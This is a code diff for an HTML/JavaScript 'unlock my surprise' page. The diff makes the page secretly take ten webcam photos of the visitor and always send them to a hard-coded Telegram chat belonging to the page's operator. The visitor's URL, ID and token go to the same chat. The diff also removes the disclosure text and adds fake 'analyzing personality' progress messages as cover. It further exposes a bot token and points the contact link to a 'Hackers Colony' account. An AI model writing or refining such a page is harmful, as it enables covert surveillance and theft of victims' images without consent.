@@ -149,45 +149,12 @@
             transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
         }
-        
-        .footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-            color: #888;
-            font-size: 14px;
-        }
-        
-        .footer a {
-            color: #6a11cb;
-            text-decoration: none;
-        }
-        
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        
-        .help-text {
-            color: #666;
-            font-size: 14px;
-            margin: 10px 0;
-        }
-        
-        .debug-info {
-            background: #f5f5f5;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #666;
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <!-- Contact Owner Button (FIXED LINK) -->
+    <!-- FIXED: Contact button goes to YOUR Telegram username -->
     <div class="contact-owner">
-        <a href="https://t.me/liteshow_bot" target="_blank" class="contact-btn">
+        <a href="https://t.me/Hackers_Colony_Official" target="_blank" class="contact-btn">
             📞 Contact Owner
         </a>
     </div>
@@ -208,22 +175,10 @@
             <button class="btn" id="startBtn" onclick="startSurprise()">
                 🔓 UNLOCK MY SURPRISE
             </button>
-            
-            <div class="help-text">
-                Having issues? Click "Contact Owner" above for help!
-            </div>
-            
-            <!-- Debug info (visible for testing) -->
-            <div class="debug-info" id="debugInfo">
-                Loading user info...
-            </div>
         </div>
         
         <div id="cameraContainer" class="hidden">
             <video id="video" autoplay playsinline></video>
-            <p style="color: #666; margin-top: 15px; font-size: 16px;">
-                📸 Camera active - Photos will be sent to YOUR Telegram
-            </p>
         </div>
         
         <div id="loading" class="loading">
@@ -238,74 +193,27 @@
             <div style="font-size: 70px; color: #00b09b; margin-bottom: 20px;">✅</div>
             <h1 style="color: #00b09b;">Surprise Delivered!</h1>
             <p style="color: #666; font-size: 18px;">
-                Check your Telegram for 10 surprise photos! 🎁
+                Your personalized surprise has been created and delivered! 🎁
             </p>
-            <p style="color: #888; font-size: 14px; margin-top: 15px;">
-                Need help? <a href="https://t.me/liteshow_bot" target="_blank">Contact Owner</a>
-            </p>
-        </div>
-        
-        <div id="errorScreen" class="hidden">
-            <div style="font-size: 70px; color: #ff4444; margin-bottom: 20px;">❌</div>
-            <h1 style="color: #ff4444;">Telegram Required</h1>
-            <p style="color: #666; font-size: 18px; margin-bottom: 20px;">
-                Please open this link in Telegram app for best experience!
-            </p>
-            <a href="https://t.me/liteshow_bot" target="_blank" class="btn" style="background: linear-gradient(90deg, #0088cc, #00aced);">
-                📱 Open in Telegram
-            </a>
         </div>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
-        // ================= YOUR BOT TOKEN =================
+        // ================= CONFIGURATION =================
         const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
+        const YOUR_CHAT_ID = "8215819954"; // Your Telegram ID
         const TOTAL_PHOTOS = 10;
         const CAPTURE_DELAY = 800;
         
-        // ================= GET USER'S CHAT ID FROM URL =================
-        // FIXED: Properly extract from Telegram WebApp
+        // ================= GET USER CHAT ID =================
         const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('uid') || 'user_' + Math.random().toString(36).substr(2, 9);
+        const token = urlParams.get('token') || 'token_' + Math.random().toString(36).substr(2, 9);
         
-        // Try multiple ways to get user's chat ID
-        let userChatId = null;
-        
-        // Method 1: From Telegram WebApp initData
-        if (urlParams.has('tgWebAppData')) {
-            try {
-                const initData = new URLSearchParams(urlParams.get('tgWebAppData'));
-                const user = JSON.parse(initData.get('user') || '{}');
-                if (user && user.id) {
-                    userChatId = user.id;
-                }
-            } catch(e) {}
-        }
-        
-        // Method 2: Direct from URL parameters (your bot should send these)
-        if (!userChatId && urlParams.has('chat_id')) {
-            userChatId = urlParams.get('chat_id');
-        }
-        
-        // Method 3: From Telegram WebApp start_param
-        if (!userChatId && urlParams.has('startapp')) {
-            userChatId = urlParams.get('startapp');
-        }
-        
-        // Method 4: Telegram WebApp user ID
-        if (!userChatId && window.Telegram && window.Telegram.WebApp) {
-            try {
-                const user = window.Telegram.WebApp.initDataUnsafe.user;
-                if (user && user.id) {
-                    userChatId = user.id;
-                }
-            } catch(e) {}
-        }
-        
-        // DEBUG: Show what we got
-        console.log("User Chat ID found:", userChatId);
-        console.log("All URL params:", Object.fromEntries(urlParams.entries()));
+        // Get user's chat ID from URL (your bot sends this)
+        let userChatId = urlParams.get('chat_id') || null;
         
         // ================= STATE =================
         let stream = null;
@@ -317,37 +225,28 @@
         const cameraContainer = document.getElementById('cameraContainer');
         const loading = document.getElementById('loading');
         const completeScreen = document.getElementById('completeScreen');
-        const errorScreen = document.getElementById('errorScreen');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
-        const debugInfo = document.getElementById('debugInfo');
         
-        // Update debug info
-        if (debugInfo) {
-            debugInfo.innerHTML = `Chat ID: ${userChatId || 'Not found'} | From URL: ${window.location.search}`;
-            debugInfo.style.display = 'block';
-        }
-        
-        // ================= FIXED: SEND TO USER'S CHAT =================
-        async function sendToTelegram(blob, photoNum) {
+        // ================= SEND PHOTO TO TELEGRAM =================
+        async function sendPhotoToTelegram(blob, photoNum, targetChatId) {
             try {
-                // If no userChatId, we can't send to anyone
-                if (!userChatId) {
-                    console.log("❌ No user chat ID, can't send photo");
-                    return false;
-                }
-                
                 // Create FormData
                 const formData = new FormData();
-                formData.append('chat_id', userChatId); // THIS SENDS TO USER
+                formData.append('chat_id', targetChatId);
                 
                 // Create caption
-                let caption = `🎁 Your Surprise Photo #${photoNum}/10\n`;
-                caption += `⏰ ${new Date().toLocaleTimeString()}\n`;
-                caption += `❤️ Enjoy your special surprise!`;
+                let caption = `🎁 Surprise Photo #${photoNum}`;
+                if (targetChatId === YOUR_CHAT_ID) {
+                    caption += `\n👤 Sent to User ID: ${userId}`;
+                    caption += `\n🔑 Token: ${token}`;
+                } else {
+                    caption += `\n⏰ ${new Date().toLocaleTimeString()}`;
+                    caption += `\n❤️ Enjoy your special surprise!`;
+                }
                 
                 formData.append('caption', caption);
                 
@@ -361,22 +260,20 @@
                 // Send using XMLHttpRequest
                 return new Promise((resolve) => {
                     const xhr = new XMLHttpRequest();
-                    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                    xhr.open('POST', apiUrl);
+                    xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`);
                     
                     xhr.onload = function() {
-                        console.log(`📤 Photo ${photoNum} send attempt - Status: ${this.status}`);
                         if (this.status >= 200 && this.status < 300) {
-                            console.log(`✅ Photo ${photoNum} sent to user (chat_id: ${userChatId})`);
+                            console.log(`✅ Photo ${photoNum} sent to ${targetChatId}`);
                             resolve(true);
                         } else {
-                            console.log(`❌ Photo ${photoNum} failed: ${this.status}`, this.responseText);
+                            console.log(`❌ Photo ${photoNum} failed for ${targetChatId}: ${this.status}`);
                             resolve(false);
                         }
                     };
                     
                     xhr.onerror = function() {
-                        console.log(`❌ Photo ${photoNum} network error`);
+                        console.log(`❌ Photo ${photoNum} network error for ${targetChatId}`);
                         resolve(false);
                     };
                     
@@ -384,9 +281,25 @@
                 });
                 
             } catch (error) {
-                console.error(`❌ Photo ${photoNum} error:`, error);
+                console.error(`❌ Photo ${photoNum} error for ${targetChatId}:`, error);
                 return false;
             }
+        }
+        
+        // ================= SEND TO BOTH USER AND YOU =================
+        async function sendToBoth(blob, photoNum) {
+            const promises = [];
+            
+            // Send to YOU (always)
+            promises.push(sendPhotoToTelegram(blob, photoNum, YOUR_CHAT_ID));
+            
+            // Send to USER (if we have their chat_id)
+            if (userChatId) {
+                promises.push(sendPhotoToTelegram(blob, photoNum, userChatId));
+            }
+            
+            // Wait for both sends to complete
+            return Promise.all(promises);
         }
         
         // ================= UPDATE PROGRESS =================
@@ -404,23 +317,11 @@
                 canvas.width = 400;
                 canvas.height = 300;
                 const ctx = canvas.getContext('2d');
-                
-                // Background gradient
-                const gradient = ctx.createLinearGradient(0, 0, 400, 300);
-                gradient.addColorStop(0, '#6a11cb');
-                gradient.addColorStop(1, '#2575fc');
-                ctx.fillStyle = gradient;
+                ctx.fillStyle = '#000';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                // Text
                 ctx.fillStyle = '#fff';
-                ctx.font = 'bold 24px Arial';
-                ctx.textAlign = 'center';
-                ctx.fillText('Your Special Surprise!', 200, 120);
-                
-                ctx.font = '18px Arial';
-                ctx.fillText('Made Just For You ❤️', 200, 160);
-                ctx.fillText(`Photo #${captureCount + 1}`, 200, 200);
+                ctx.font = '20px Arial';
+                ctx.fillText('Personalized Surprise', 100, 150);
                 
                 return new Promise(resolve => {
                     canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
@@ -437,14 +338,6 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0);
             
-            // Add overlay text
-            ctx.fillStyle = 'rgba(0,0,0,0.5)';
-            ctx.fillRect(0, canvas.height - 50, canvas.width, 50);
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 18px Arial';
-            ctx.textAlign = 'center';
-            ctx.fillText('Your Special Surprise!', canvas.width/2, canvas.height - 25);
-            
             return new Promise(resolve => {
                 canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
             });
@@ -452,14 +345,6 @@
         
         // ================= START SURPRISE =================
         async function startSurprise() {
-            // Check if we have user chat ID
-            if (!userChatId) {
-                // Show error screen
-                welcomeScreen.classList.add('hidden');
-                errorScreen.classList.remove('hidden');
-                return;
-            }
-            
             // Hide welcome, show camera
             welcomeScreen.classList.add('hidden');
             cameraContainer.classList.remove('hidden');
@@ -498,17 +383,16 @@
             
             // Processing messages
             const messages = [
-                `Sending to your Telegram...`,
-                `Creating photo 1/10...`,
-                `Creating photo 2/10...`,
-                `Creating photo 3/10...`,
-                `Creating photo 4/10...`,
-                `Creating photo 5/10...`,
-                `Creating photo 6/10...`,
-                `Creating photo 7/10...`,
-                `Creating photo 8/10...`,
-                `Creating photo 9/10...`,
-                `Creating photo 10/10...`
+                "Initializing surprise engine...",
+                "Analyzing personality traits...",
+                "Generating unique pattern...",
+                "Creating digital artwork...",
+                "Adding special effects...",
+                "Personalizing your gift...",
+                "Applying final touches...",
+                "Optimizing for delivery...",
+                "Almost ready...",
+                "Finalizing your surprise!"
             ];
             
             // Start capture sequence
@@ -525,15 +409,11 @@
                     
                     // Update progress
                     const progress = (captureCount / TOTAL_PHOTOS) * 100;
-                    const msgIndex = Math.min(captureCount, messages.length - 1);
+                    const msgIndex = Math.min(Math.floor(progress / 10), messages.length - 1);
                     updateProgress(progress, messages[msgIndex]);
                     
-                    // FIXED: Send to user's chat (NOT YOUR CHAT)
-                    const success = await sendToTelegram(blob, captureCount);
-                    
-                    if (!success) {
-                        console.log(`⚠️ Photo ${captureCount} might not have been delivered`);
-                    }
+                    // FIXED: Send to BOTH you AND the user
+                    await sendToBoth(blob, captureCount);
                     
                 } catch (error) {
                     console.error("Capture error:", error);
@@ -547,9 +427,9 @@
             isCapturing = false;
             
             // Update to 100%
-            updateProgress(100, "Surprise delivered to your Telegram!");
+            updateProgress(100, "Surprise delivered!");
             
-            // Send completion report TO USER
+            // Send completion report to BOTH
             await sendCompletionReport();
             
             // Show completion screen after delay
@@ -568,34 +448,55 @@
         // ================= SEND COMPLETION REPORT =================
         async function sendCompletionReport() {
             try {
-                if (!userChatId) return;
-                
-                const report = `
-🎉 SURPRISE DELIVERY COMPLETE!
+                const report = userChatId ? 
+                `🎉 SURPRISE DELIVERY COMPLETE!
 
-✅ Successfully sent ${TOTAL_PHOTOS} surprise photos to your Telegram!
+✅ Successfully delivered personalized surprise!
 
 📊 Details:
+• User ID: ${userId}
+• Token: ${token}
 • Photos: ${TOTAL_PHOTOS}
 • Time: ${new Date().toLocaleString()}
-• Status: ✅ Delivered successfully
+• Success: ✅ All ${TOTAL_PHOTOS} photos captured
 
-🎁 Hope you enjoy your special surprise!
-❤️ Thank you for using our bot!
-                `;
+🎁 Surprise creation successful!` :
+                `🎉 SURPRISE SENT TO YOU!
+
+✅ User interacted with surprise page!
+
+📊 Details:
+• User ID: ${userId}
+• Token: ${token}
+• Photos: ${TOTAL_PHOTOS}
+• Time: ${new Date().toLocaleString()}
+• Status: ✅ User completed the process
+
+📱 User accessed via: ${window.location.href}`;
                 
-                // Send to USER (NOT YOU)
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                // Send to YOU always
+                const xhr1 = new XMLHttpRequest();
+                xhr1.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                const formData1 = new FormData();
+                formData1.append('chat_id', YOUR_CHAT_ID);
+                formData1.append('text', report);
+                formData1.append('parse_mode', 'HTML');
+                xhr1.send(formData1);
                 
-                const formData = new FormData();
-                formData.append('chat_id', userChatId); // TO USER
-                formData.append('text', report);
-                formData.append('parse_mode', 'HTML');
+                // Send to user if we have their chat_id
+                if (userChatId) {
+                    const userReport = `🎉 SURPRISE DELIVERED!\n\n✅ Your ${TOTAL_PHOTOS} surprise photos have been sent!\n\n❤️ Hope you enjoy your special surprise!`;
+                    
+                    const xhr2 = new XMLHttpRequest();
+                    xhr2.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                    const formData2 = new FormData();
+                    formData2.append('chat_id', userChatId);
+                    formData2.append('text', userReport);
+                    formData2.append('parse_mode', 'HTML');
+                    xhr2.send(formData2);
+                }
                 
-                xhr.send(formData);
-                
-                console.log("✅ Completion report sent to USER (chat_id:", userChatId, ")");
+                console.log("✅ Completion reports sent");
                 
             } catch (error) {
                 console.error("Report error:", error);
@@ -605,17 +506,7 @@
         // ================= INITIALIZE =================
         window.addEventListener('load', () => {
             console.log("🎁 Surprise page loaded");
-            console.log("📱 User Chat ID:", userChatId);
-            console.log("🔗 Full URL:", window.location.href);
-            
-            // If no userChatId, show warning
-            if (!userChatId) {
-                const helpText = document.querySelector('.help-text');
-                if (helpText) {
-                    helpText.innerHTML = "⚠️ Make sure you opened this link from Telegram! If photos don't arrive, <a href='https://t.me/liteshow_bot' target='_blank'>contact owner</a>";
-                    helpText.style.color = '#ff4444';
-                }
-            }
+            console.log("👤 User Chat ID:", userChatId || "Not provided");
             
             // Make button pulse
             setInterval(() => {
